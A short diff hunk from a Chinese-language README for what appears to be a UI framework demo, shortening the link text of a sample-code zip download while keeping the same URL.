@@ -10,7 +10,7 @@
 
 ## 示例代码下载 
 
-[代码下载](https://raw.githubusercontent.com/penosext/bs_haasui/refs/heads/master/falcon-demo-v2.zip)
+[下载](https://raw.githubusercontent.com/penosext/bs_haasui/refs/heads/master/falcon-demo-v2.zip)
 
 ##  Chrome浏览器体验 
 
